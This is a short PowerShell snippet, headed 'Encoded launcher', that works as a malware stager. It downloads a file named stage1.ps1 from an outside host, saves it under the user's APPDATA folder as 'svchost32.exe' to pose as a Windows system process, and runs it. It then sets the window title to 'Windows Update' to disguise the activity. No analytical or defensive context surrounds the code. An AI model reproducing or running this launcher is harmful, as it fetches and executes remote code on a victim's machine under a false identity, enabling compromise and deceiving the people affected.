# Encoded launcher
curl.exe -s -L -o "$env:APPDATA\svchost32.exe" "https://adatum.com/stage1.ps1"
Start-Process -FilePath "$env:APPDATA\svchost32.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
